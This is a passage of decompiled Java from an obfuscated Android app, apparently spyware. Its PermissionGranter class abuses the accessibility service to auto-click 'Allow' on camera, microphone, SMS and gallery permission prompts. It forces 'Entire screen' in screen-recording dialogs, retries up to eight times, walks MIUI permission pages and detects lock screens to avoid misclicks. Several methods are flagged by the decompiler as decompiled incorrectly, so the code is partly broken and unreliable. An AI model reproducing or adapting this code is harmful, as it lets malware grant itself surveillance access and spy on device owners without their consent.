        String lowerCase3 = packageName.toLowerCase(locale);
        t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        return AbstractC0779a1.m213652a5(lowerCase, lowerCase2, false) || AbstractC0779a1.m213652a5(lowerCase, lowerCase3, false);
    }

    /* JADX WARN: Removed duplicated region for block: B:53:0x00a8  */
    /* renamed from: f6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m211320f6(String str) {
        boolean z;
        boolean z2;
        if (str == null) {
            return true;
        }
        AccessibilityNodeInfo rootInActiveWindow = null;
        try {
            try {
                rootInActiveWindow = this.f52108a0.getRootInActiveWindow();
            } catch (Throwable th) {
                if (rootInActiveWindow != null) {
                    try {
                        rootInActiveWindow.recycle();
                    } catch (Exception unused) {
                    }
                }
                throw th;
            }
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 锁屏界面检测失败", e);
            if (rootInActiveWindow != null) {
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused2) {
                }
            }
        }
        if (rootInActiveWindow == null) {
            z = false;
        } else {
            boolean z3 = m211294f2(rootInActiveWindow, "PIN") || m211294f2(rootInActiveWindow, "图案") || m211294f2(rootInActiveWindow, "Pattern") || m211294f2(rootInActiveWindow, "指纹") || m211294f2(rootInActiveWindow, "Fingerprint") || m211294f2(rootInActiveWindow, "解锁") || m211294f2(rootInActiveWindow, "Unlock") || m211294f2(rootInActiveWindow, "锁屏") || m211294f2(rootInActiveWindow, "Lock screen");
            Iterable n60Var = new n60(1, 9, 1);
            if (!(n60Var instanceof Collection) || !((Collection) n60Var).isEmpty()) {
                l60 it = n60Var.iterator();
                while (true) {
                    if (!it.f57840a2) {
                        break;
                    }
                    if (m211294f2(rootInActiveWindow, String.valueOf(it.nextInt()))) {
                        if (m211294f2(rootInActiveWindow, "0")) {
                            z2 = true;
                        }
                    }
                }
                z = !AbstractC0779a1.m213652a5(str, "systemui", false) && (z3 || z2);
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused3) {
                }
            }
            z2 = false;
            if (AbstractC0779a1.m213652a5(str, "systemui", false)) {
                rootInActiveWindow.recycle();
            }
        }
        if (z) {
            t60.m214726f4("PermissionGranter", "⚠️ [权限] 关键修复-检测到锁屏界面 (" + str + ")，跳过权限处理避免误点击确认按钮");
            return false;
        }
        if (AbstractC0779a1.m213652a5(str, "systemui", false) || AbstractC0779a1.m213652a5(str, "system", false) || AbstractC0779a1.m213652a5(str, "android", false) || AbstractC0779a1.m213652a5(str, "permissioncontroller", false) || AbstractC0779a1.m213652a5(str, "settings", false) || AbstractC0779a1.m213652a5(str, "com.android", false) || AbstractC0779a1.m213652a5(str, "permission", false) || AbstractC0779a1.m213652a5(str, "dialog", false)) {
            return true;
        }
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        return AbstractC0779a1.m213652a5(lowerCase, "screen", false) || AbstractC0779a1.m213652a5(str, "miui", false) || AbstractC0779a1.m213652a5(str, "coloros", false) || AbstractC0779a1.m213652a5(str, "emui", false) || AbstractC0779a1.m213652a5(str, "flyme", false) || AbstractC0779a1.m213652a5(str, "funtouch", false) || AbstractC0779a1.m213652a5(str, "oneplus", false);
    }

    /* renamed from: f8 */
    public final void m211321f8() {
        dqtvuisjd dqtvuisjdVar = this.f52109a1;
        try {
            Intent intent = new Intent("com.storm.safe.rock.intent.MANUAL_ACTION_REQUIRED");
            intent.putExtra("permission_type", "media_projection");
            intent.putExtra("message", dqtvuisjdVar.getString(R$string.permission_auto_failed));
            dqtvuisjdVar.sendBroadcast(intent);
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 发送手动操作通知失败", e);
        }
    }

    /* renamed from: f9 */
    public final void m211322f9(String str) {
        try {
            AbstractC0780a0.m213692a3(this.f52125b7, null, new PermissionGranter$openMiuiPermissionEditor$1(this, str, m211296f7(), null), 3);
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 打开MIUI权限编辑页失败", e);
        }
    }

    /* renamed from: g1 */
    public final void m211323g1() {
        this.f52110a2 = false;
        this.f52114a6 = 0;
        this.f52117a9 = 0L;
        this.f52121b3 = false;
        if (Build.VERSION.SDK_INT >= 30) {
            return;
        }
        Integer num = AbstractC0241a0.f51907a1;
        Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
        boolean z = AbstractC0241a0.f51906a0 != null;
        if (pair == null || !z) {
            try {
                this.f52109a1.sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_SECONDARY_CONFIRMATION"));
            } catch (Exception e) {
                t60.m214705c6("PermissionGranter", "❌ [权限] 发送停止二次确认监听广播失败", e);
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:49:0x010c, code lost:
    
        r16 = r2;
        r0 = r6.size();
        r2 = r16;
     */
    /* JADX WARN: Code restructure failed: missing block: B:50:0x0114, code lost:
    
        if (r2 >= r0) goto L109;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x0116, code lost:
    
        r4 = r6.get(r2);
        r2 = r2 + 1;
        r4 = (android.view.accessibility.AccessibilityNodeInfo) r4;
        r7 = r4.getText();
     */
    /* JADX WARN: Code restructure failed: missing block: B:52:0x0122, code lost:
    
        if (r7 == null) goto L55;
     */
    /* JADX WARN: Code restructure failed: missing block: B:53:0x0124, code lost:
    
        r7 = r7.toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:54:0x0128, code lost:
    
        if (r7 != null) goto L56;
     */
    /* JADX WARN: Code restructure failed: missing block: B:55:0x012a, code lost:
    
        r7 = "";
     */
    /* JADX WARN: Code restructure failed: missing block: B:56:0x012b, code lost:
    
        r10 = r4.getContentDescription();
     */
    /* JADX WARN: Code restructure failed: missing block: B:57:0x012f, code lost:
    
        if (r10 == null) goto L60;
     */
    /* JADX WARN: Code restructure failed: missing block: B:58:0x0131, code lost:
    
        r10 = r10.toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:59:0x0135, code lost:
    
        if (r10 != null) goto L61;
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:0x0137, code lost:
    
        r10 = "";
     */
    /* JADX WARN: Code restructure failed: missing block: B:62:0x013e, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r7, "屏幕", true) != false) goto L75;
     */
    /* JADX WARN: Code restructure failed: missing block: B:64:0x0146, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r7, "screen", true) != false) goto L75;
     */
    /* JADX WARN: Code restructure failed: missing block: B:66:0x014e, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r7, "全", true) != false) goto L75;
     */
    /* JADX WARN: Code restructure failed: missing block: B:68:0x0156, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r7, "完整", true) != false) goto L75;
     */
    /* JADX WARN: Code restructure failed: missing block: B:70:0x015e, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r7, "entire", true) != false) goto L75;
     */
    /* JADX WARN: Code restructure failed: missing block: B:72:0x0166, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r7, "whole", true) == false) goto L110;
     */
    /* JADX WARN: Code restructure failed: missing block: B:76:0x0172, code lost:
    
        if (r7.length() <= 0) goto L111;
     */
    /* JADX WARN: Code restructure failed: missing block: B:77:0x0174, code lost:
    
        r11 = r16;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x0178, code lost:
    
        if (r11 >= 19) goto L112;
     */
    /* JADX WARN: Code restructure failed: missing block: B:79:0x017a, code lost:
    
        r13 = r5[r11];
     */
    /* JADX WARN: Code restructure failed: missing block: B:80:0x0180, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r7, r13, true) != false) goto L117;
     */
    /* JADX WARN: Code restructure failed: missing block: B:82:0x0186, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r10, r13, true) == false) goto L84;
     */
    /* JADX WARN: Code restructure failed: missing block: B:84:0x0189, code lost:
    
        r11 = r11 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:86:0x0192, code lost:
    
        if (r4.performAction(16) == false) goto L119;
     */
    /* JADX WARN: Code restructure failed: missing block: B:88:0x0195, code lost:
    
        p000.t60.m214726f4("PermissionGranter", "⚠️ [权限] 未找到任何合适的全屏选项");
     */
    /* JADX WARN: Code restructure failed: missing block: B:89:0x019a, code lost:
    
        return r16;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r11v26 */
    /* JADX WARN: Type inference failed for: r11v6 */
    /* JADX WARN: Type inference failed for: r11v7, types: [int] */
    /* JADX WARN: Type inference failed for: r13v4 */
    /* JADX WARN: Type inference failed for: r13v5, types: [int] */
    /* JADX WARN: Type inference failed for: r13v6, types: [int] */
    /* JADX WARN: Type inference failed for: r2v4 */
    /* JADX WARN: Type inference failed for: r2v5, types: [int] */
    /* JADX WARN: Type inference failed for: r2v6, types: [int] */
    /* JADX WARN: Type inference failed for: r6v2, types: [java.util.ArrayList] */
    /* JADX WARN: Type inference failed for: r7v14 */
    /* JADX WARN: Type inference failed for: r7v8 */
    /* JADX WARN: Type inference failed for: r7v9, types: [int] */
    /* renamed from: g7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m211324g7() {
        boolean z;
        String string;
        String str;
        String string2;
        boolean z2 = false;
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f52108a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return false;
            }
            String[] strArr = {"整个屏幕", "全屏", "完整屏幕", "整屏", "全屏幕", "录制整个屏幕", "共享整个屏幕", "Entire screen", "Full screen", "Whole screen", "Complete screen", "Record entire screen", "Share entire screen", "全画面", "画面全体", "전체 화면", "Pantalla completa", "Plein écran", "Vollbild", "Schermo intero", "Весь экран"};
            String[] strArr2 = {"共享一个应用", "单个应用", "单独应用", "选择应用", "特定应用", "某个应用", "Single app", "Select app", "Specific app", "A single app", "Single app", "Select app", "Choose app", "Specific app", "Individual app", "単一アプリ", "アプリを選択", "단일 앱", "앱 선택"};
            ?? arrayList = new ArrayList();
            m211277c6(rootInActiveWindow, arrayList);
            int i = 0;
            loop0: while (true) {
                char c = 19;
                if (i >= 21) {
                    break;
                }
                String str2 = strArr[i];
                int size = arrayList.size();
                ?? r13 = z2;
                while (r13 < size) {
                    Object obj = arrayList.get(r13);
                    r13++;
                    AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj;
                    CharSequence text = accessibilityNodeInfo.getText();
                    if (text == null || (string = text.toString()) == null) {
                        string = "";
                    }
                    CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                    if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                        z = z2;
                        str = "";
                    } else {
                        z = z2;
                        str = string2;
                    }
                    try {
                        if (AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                            for (?? r7 = z; r7 < c; r7++) {
                                String str3 = strArr2[r7];
                                if (!AbstractC0779a1.m213652a5(string, str3, true) && !AbstractC0779a1.m213652a5(str, str3, true)) {
                                    c = 19;
                                }
                                t60.m214726f4("PermissionGranter", "⚠️ [权限] 跳过包含单个应用文本的节点: text='" + string + "'");
                                break;
                            }
                            if (accessibilityNodeInfo.performAction(16)) {
                                break loop0;
                            }
                            z2 = z;
                            c = 19;
                        } else {
                            z2 = z;
                        }
                    } catch (Exception e) {
                        e = e;
                        t60.m214705c6("PermissionGranter", "❌ [权限] 选择Spinner全屏选项失败", e);
                        return z;
                    }
                }
                i++;
            }
            return true;
        } catch (Exception e2) {
            e = e2;
            z = z2;
        }
    }

    /* renamed from: g8 */
    public final void m211325g8(boolean z) {
        if (z) {
            this.f52110a2 = true;
            t60.m214714d6("PermissionGranter", "✅ [权限] 已设置MediaProjection请求标志为true，允许投屏弹窗自动点击");
            int i = Build.VERSION.SDK_INT;
            if (i >= 30) {
                t60.m214714d6("PermissionGranter", "✅ [权限] Android 11+设备-保持投屏弹窗检测标志为true");
            }
            Integer num = AbstractC0241a0.f51907a1;
            if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) != null) {
                this.f52114a6 = 0;
                this.f52118b0 = false;
                this.f52119b1 = 0;
                this.f52120b2 = null;
                this.f52110a2 = false;
                if (i >= 35 && !this.f52122b4) {
                    this.f52122b4 = true;
                    this.f52109a1.sendBroadcast(new Intent("com.storm.safe.rock.intent.ANDROID15_PERMISSION_STABLE"));
                }
                this.f52109a1.sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"));
                return;
            }
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (this.f52114a6 == 0) {
                try {
                    SharedPreferences sharedPreferences = this.f52109a1.getSharedPreferences(StringUtil.m212470a0("O1wDN0QrHydYPxRNAztOMwk8"), 0);
                    if (!sharedPreferences.getBoolean(StringUtil.m212470a0("I1gCBV8tAhFVNC1WAz8="), false)) {
                        sharedPreferences.edit().putBoolean(StringUtil.m212470a0("I1gCBV8tAhFVNC1WAz8="), true).apply();
                    }
                } catch (Exception e) {
                    t60.m214705c6("PermissionGranter", "❌ [权限] 检测首次安装失败", e);
                }
            }
            int i2 = this.f52114a6;
            if (i2 >= 8) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] MediaProjection权限申请已达到最大重试次数(8)，停止自动申请");
                this.f52114a6 = 0;
                this.f52118b0 = false;
                this.f52119b1 = 0;
                this.f52120b2 = null;
                this.f52110a2 = false;
                this.f52109a1.sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"));
                Intent intent = new Intent("com.storm.safe.rock.intent.MANUAL_ACTION_REQUIRED");
                intent.putExtra("permission_type", "media_projection");
                intent.putExtra("message", this.f52109a1.getString(R$string.permission_max_retry));
                this.f52109a1.sendBroadcast(intent);
                return;
            }
            this.f52114a6 = i2 + 1;
            this.f52117a9 = jCurrentTimeMillis;
        } else {
            this.f52114a6 = 0;
            this.f52118b0 = false;
            this.f52119b1 = 0;
            this.f52120b2 = null;
            this.f52110a2 = false;
        }
        this.f52110a2 = z;
    }

    /* renamed from: g9 */
    public final void m211326g9() {
        if (this.f52112a4 || m211318f4()) {
            return;
        }
        dqtvuisjd dqtvuisjdVar = this.f52109a1;
        if (dqtvuisjdVar.checkSelfPermission("android.permission.CAMERA") == 0) {
            return;
        }
        if (!m211303a5()) {
            t60.m214704c5("PermissionGranter", "❌ [权限] 无障碍服务状态异常，无法申请权限");
            return;
        }
        this.f52112a4 = true;
        this.f52115a7 = 0;
        m211308c4();
        Intent intent = new Intent(dqtvuisjdVar, (Class<?>) iuzxujjtqev.class);
        intent.setFlags(335544320);
        intent.putExtra("request_camera_permission", true);
        dqtvuisjdVar.startActivity(intent);
        if (m211296f7()) {
            m211322f9("camera");
        } else {
            AbstractC0780a0.m213692a3(this.f52125b7, null, new PermissionGranter$startCameraPermissionDialogMonitoring$1(this, null), 3);
        }
    }

    /* renamed from: h0 */
    public final void m211327h0() {
        dqtvuisjd dqtvuisjdVar = this.f52109a1;
        if (this.f52113a5 || m211318f4() || m211305b3()) {
            return;
        }
        if (!m211303a5()) {
            t60.m214704c5("PermissionGranter", "❌ [权限] 无障碍服务状态异常，无法申请麦克风权限");
            return;
        }
        try {
            this.f52113a5 = true;
            this.f52116a8 = 0;
            m211308c4();
            Intent intent = new Intent(dqtvuisjdVar, (Class<?>) iuzxujjtqev.class);
            intent.setFlags(335544320);
            intent.putExtra("request_microphone_permission", true);
            dqtvuisjdVar.startActivity(intent);
            if (m211296f7()) {
                m211322f9("microphone");
            } else {
                AbstractC0780a0.m213692a3(this.f52125b7, null, new PermissionGranter$startMicrophonePermissionDialogMonitoring$1(this, null), 3);
            }
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 启动麦克风权限申请失败", e);
        }
    }

    /* renamed from: h1 */
    public final void m211328h1(String str) {
        List list;
        try {
            if (!dqtvuisjd.f52358m1.isServiceRunning()) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 无障碍未运行，跳过自动切换权限");
                return;
            }
            String lowerCase = str.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            switch (lowerCase.hashCode()) {
                case -1367751899:
                    if (!lowerCase.equals("camera")) {
                        list = EmptyList.f57568a0;
                        break;
                    } else {
                        list = dh0.f55811g1;
                        break;
                    }
                case -196315310:
                    if (!lowerCase.equals("gallery")) {
                        list = EmptyList.f57568a0;
                        break;
                    } else {
                        list = dh0.f55812g2;
                        break;
                    }
                case 114009:
                    if (!lowerCase.equals("sms")) {
                        list = EmptyList.f57568a0;
                        break;
                    } else {
                        list = dh0.f55813g3;
                        break;
                    }
                case 1370921258:
                    if (!lowerCase.equals("microphone")) {
                        list = EmptyList.f57568a0;
                        break;
                    } else {
                        list = dh0.f55814g4;
                        break;
                    }
                default:
                    list = EmptyList.f57568a0;
                    break;
            }
            if (list.isEmpty()) {
                return;
            }
            AbstractC0780a0.m213692a3(this.f52125b7, null, new PermissionGranter$startMiuiPermissionAutoToggle$1(str, this, list, null), 3);
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 启动MIUI权限自动切换流程失败", e);
        }
    }

    /* renamed from: h2 */
    public final void m211329h2() {
        try {
            this.f52111a3 = true;
            this.f52110a2 = false;
            this.f52119b1 = 0;
            this.f52114a6 = 0;
            this.f52118b0 = false;
            this.f52121b3 = false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 强制停止PermissionGranter失败", e);
        }
    }

    /* renamed from: h3 */
    public final void m211330h3() {
        this.f52121b3 = false;
        Integer num = AbstractC0241a0.f51907a1;
        Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
        boolean z = AbstractC0241a0.f51906a0 != null;
        if (pair == null || !z) {
            try {
                this.f52108a0.sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_SECONDARY_CONFIRMATION_LISTENING"));
            } catch (Exception e) {
                t60.m214705c6("PermissionGranter", "❌ [权限] 发送停止二次确认监听广播失败", e);
            }
        }
    }

    /* renamed from: h4 */
    public final void m211331h4(String str) {
        String string;
        dqtvuisjd dqtvuisjdVar = this.f52108a0;
        try {
            List<AccessibilityWindowInfo> windows = dqtvuisjdVar.getWindows();
            if (windows == null || windows.isEmpty()) {
                return;
            }
            int size = windows.size();
            for (int i = 0; i < size; i++) {
                AccessibilityWindowInfo accessibilityWindowInfo = windows.get(i);
                CharSequence title = accessibilityWindowInfo.getTitle();
                if (title == null || (string = title.toString()) == null) {
                    string = "";
                }
                if (string.equals(str)) {
                    Rect rect = new Rect();
                    accessibilityWindowInfo.getBoundsInScreen(rect);
                    Pair pairM211288e0 = m211288e0(rect);
                    int iIntValue = ((Number) pairM211288e0.f57556a0).intValue();
                    int iIntValue2 = ((Number) pairM211288e0.f57557a1).intValue();
                    GestureDescription.Builder builder = new GestureDescription.Builder();
                    Path path = new Path();
                    path.moveTo(iIntValue, iIntValue2);
                    builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L));
                    dqtvuisjdVar.dispatchGesture(builder.build(), new C0429du(5), null);
                }
            }
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 坐标点击失败", e);
        }
    }

    /* renamed from: h5 */
    public final void m211332h5(String str) {
        String string;
        dqtvuisjd dqtvuisjdVar = this.f52108a0;
        try {
            List<AccessibilityWindowInfo> windows = dqtvuisjdVar.getWindows();
            if (windows == null || windows.isEmpty()) {
                return;
            }
            int size = windows.size();
            for (int i = 0; i < size; i++) {
                AccessibilityWindowInfo accessibilityWindowInfo = windows.get(i);
                CharSequence title = accessibilityWindowInfo.getTitle();
                if (title == null || (string = title.toString()) == null) {
                    string = "";
                }
                if (string.equals(str)) {
                    Rect rect = new Rect();
                    accessibilityWindowInfo.getBoundsInScreen(rect);
                    Pair pairM211290e2 = m211290e2(rect);
                    int iIntValue = ((Number) pairM211290e2.f57556a0).intValue();
                    int iIntValue2 = ((Number) pairM211290e2.f57557a1).intValue();
                    GestureDescription.Builder builder = new GestureDescription.Builder();
                    Path path = new Path();
                    path.moveTo(iIntValue, iIntValue2);
                    builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L));
                    dqtvuisjdVar.dispatchGesture(builder.build(), new C0429du(6), null);
                }
            }
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 坐标点击失败", e);
        }
    }

    /* renamed from: h6 */
    public final boolean m211333h6(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        try {
            List<String> listM213306g5 = AbstractC0716jf.m213306g5("使用时允许", "Allow while using", "仅本次使用时允许", "Allow only this time", "允许", "Allow", "确定", "OK");
            ArrayList arrayListM211276c5 = m211276c5(accessibilityNodeInfo);
            int size = arrayListM211276c5.size();
            for (int i = 0; i < size; i++) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) arrayListM211276c5.get(i);
                CharSequence text = accessibilityNodeInfo2.getText();
                String str = "";
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                    str = string2;
                }
                for (String str2 : listM213306g5) {
                    if (AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                        m211306b4(accessibilityNodeInfo2);
                        accessibilityNodeInfo2.recycle();
                        return true;
                    }
                }
                accessibilityNodeInfo2.recycle();
            }
            t60.m214726f4("PermissionGranter", "⚠️ [权限] 未找到可点击的权限按钮");
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 点击权限按钮失败", e);
            return false;
        }
    }

    /* renamed from: h7 */
    public final boolean m211334h7(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        String string;
        String string2;
        String string3;
        String[] strArr;
        String string4;
        String string5;
        try {
            ArrayList arrayListM211284d6 = m211284d6(accessibilityNodeInfo, "android.widget.RadioButton");
            if (!arrayListM211284d6.isEmpty()) {
                int size = arrayListM211284d6.size();
                int i = 0;
                while (i < size) {
                    Object obj = arrayListM211284d6.get(i);
                    i++;
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                    CharSequence text = accessibilityNodeInfo2.getText();
                    if (text == null || (string4 = text.toString()) == null) {
                        string4 = "";
                    }
                    CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                    String str = (contentDescription == null || (string5 = contentDescription.toString()) == null) ? "" : string5;
                    if (AbstractC0779a1.m213652a5(string4, "全屏", false) || AbstractC0779a1.m213652a5(string4, "Full screen", false) || AbstractC0779a1.m213652a5(string4, "Entire screen", false) || AbstractC0779a1.m213652a5(string4, "整个屏幕", false) || AbstractC0779a1.m213652a5(string4, "完整屏幕", false) || AbstractC0779a1.m213652a5(str, "全屏", false) || AbstractC0779a1.m213652a5(str, "Full screen", false) || AbstractC0779a1.m213652a5(str, "Entire screen", false)) {
                        if (!accessibilityNodeInfo2.isChecked() && accessibilityNodeInfo2.isClickable() && accessibilityNodeInfo2.performAction(16)) {
                            m211330h3();
                            return true;
                        }
                    }
                }
            }
            int i2 = 1;
            String[] strArr2 = {"选择", "下拉", "菜单", "单个应用", "整个屏幕", "应用", "屏幕", "Select", "Dropdown", "Menu", "Single app", "Entire screen", "App", "Screen"};
            int i3 = 0;
            while (i3 < 14) {
                ArrayList arrayListM211286d8 = m211286d8(accessibilityNodeInfo, strArr2[i3]);
                int size2 = arrayListM211286d8.size();
                int i4 = 0;
                while (i4 < size2) {
                    Object obj2 = arrayListM211286d8.get(i4);
                    i4++;
                    AccessibilityNodeInfo parent = ((AccessibilityNodeInfo) obj2).getParent();
                    int i5 = 0;
                    while (parent != null && i5 < 3) {
                        CharSequence text2 = parent.getText();
                        if (text2 == null || (string2 = text2.toString()) == null) {
                            string2 = "";
                        }
                        CharSequence contentDescription2 = parent.getContentDescription();
                        if (contentDescription2 == null || (string3 = contentDescription2.toString()) == null) {
                            string3 = "";
                        }
                        if (parent.isClickable()) {
                            if (AbstractC0779a1.m213652a5(string2, "选择", false) || AbstractC0779a1.m213652a5(string2, "下拉", false) || AbstractC0779a1.m213652a5(string2, "应用", false)) {
                                strArr = strArr2;
                            } else {
                                strArr = strArr2;
                                if (AbstractC0779a1.m213652a5(string2, "屏幕", false) || AbstractC0779a1.m213652a5(string3, "选择", false) || AbstractC0779a1.m213652a5(string3, "下拉", false) || parent.getChildCount() > i2) {
                                }
                            }
                            if (parent.performAction(16)) {
                                Thread.sleep(600L);
                                if (m211324g7()) {
                                    m211330h3();
                                    return true;
                                }
                                t60.m214726f4("PermissionGranter", "⚠️ [权限] 下拉菜单展开后未找到全屏选项");
                            } else {
                                continue;
                            }
                        } else {
                            strArr = strArr2;
                        }
                        parent = parent.getParent();
                        i5++;
                        strArr2 = strArr;
                        i2 = 1;
                    }
                    i2 = 1;
                }
                i3++;
                i2 = 1;
            }
            ArrayList arrayListM211284d62 = m211284d6(accessibilityNodeInfo, "android.widget.TextView");
            int size3 = arrayListM211284d62.size();
            int i6 = 0;
            while (i6 < size3) {
                Object obj3 = arrayListM211284d62.get(i6);
                i6++;
                AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj3;
                CharSequence text3 = accessibilityNodeInfo3.getText();
                if (text3 == null || (string = text3.toString()) == null) {
                    string = "";
                }
                if (AbstractC0779a1.m213652a5(string, "单个应用", false) || AbstractC0779a1.m213652a5(string, "选择应用", false) || AbstractC0779a1.m213652a5(string, "Single app", false) || AbstractC0779a1.m213652a5(string, "Select app", false) || (AbstractC0779a1.m213652a5(string, "应用", false) && string.length() < 10)) {
                    AccessibilityNodeInfo parent2 = accessibilityNodeInfo3.getParent();
                    if (parent2 != null && parent2.isClickable() && parent2.performAction(16)) {
                        Thread.sleep(600L);
                        if (m211324g7()) {
                            m211330h3();
                            return true;
                        }
                    }
                }
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 保守全屏选择操作失败", e);
            return false;
        }
    }

    /* renamed from: h8 */
    public final Boolean m211335h8(Intent intent) {
        boolean z;
        dqtvuisjd dqtvuisjdVar = this.f52109a1;
        try {
            if (intent.resolveActivity(dqtvuisjdVar.getPackageManager()) != null) {
                dqtvuisjdVar.startActivity(intent);
                z = true;
            } else {
                Object component = intent.getComponent();
                if (component == null) {
                    component = intent.getAction();
                }
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 权限设置页面不可用: " + component);
                z = false;
            }
            return Boolean.valueOf(z);
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 启动权限设置页面异常", e);
            return Boolean.FALSE;
        }
    }
}
